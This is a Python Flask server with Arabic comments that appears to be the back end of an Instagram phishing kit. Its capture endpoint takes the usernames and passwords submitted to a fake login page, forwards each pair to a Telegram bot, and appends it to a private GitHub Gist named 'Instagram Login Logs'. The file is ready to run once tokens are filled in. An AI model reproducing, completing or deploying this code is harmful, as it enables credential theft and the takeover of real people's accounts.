from flask import Flask, request, jsonify
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# إعدادات تلغرام
BOT_TOKEN = "YOUR_BOT_TOKEN"  # من @BotFather
CHAT_ID = "YOUR_CHAT_ID"      # من @userinfobot

# إعدادات GitHub
GITHUB_TOKEN = "YOUR_GITHUB_TOKEN"  # Personal Access Token
GIST_ID = None  # اتركه None لإنشاء Gist جديد، أو ضع ID لتحديث موجود

@app.route('/capture', methods=['POST'])
def capture():
    data = request.json
    username = data.get('username', '')
    password = data.get('password', '')
    ua = data.get('userAgent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    # رسالة تلغرام
    msg = f"🔐 New Login\n👤 {username}\n🔑 {password}\n🕒 {timestamp}\n📱 {ua}"
    send_telegram(msg)

    # تسجيل في GitHub Gist
    save_to_gist(username, password, timestamp, ua)

    return jsonify({"status": "ok"}), 200

def send_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, json=payload)

def save_to_gist(username, password, timestamp, ua):
    global GIST_ID
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    
    # محتوى جديد
    log_entry = f"[{timestamp}] User: {username} | Pass: {password} | UA: {ua}\n"
    
    if GIST_ID:
        # تحديث Gist موجود
        url = f"https://api.github.com/gists/{GIST_ID}"
        # جلب المحتوى الحالي أولاً
        resp = requests.get(url, headers=headers)
        files = resp.json()['files']
        filename = list(files.keys())[0]
        old_content = files[filename]['content']
        new_content = old_content + log_entry
        
        data = {
            "files": {
                filename: {"content": new_content}
            }
        }
        requests.patch(url, headers=headers, json=data)
    else:
        # إنشاء Gist جديد
        data = {
            "description": "Instagram Login Logs",
            "public": False,
            "files": {
                "log.txt": {"content": log_entry}
            }
        }
        resp = requests.post("https://api.github.com/gists", headers=headers, json=data)
        if resp.status_code == 201:
            GIST_ID = resp.json()['id']
            print(f"Gist created: {GIST_ID}")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
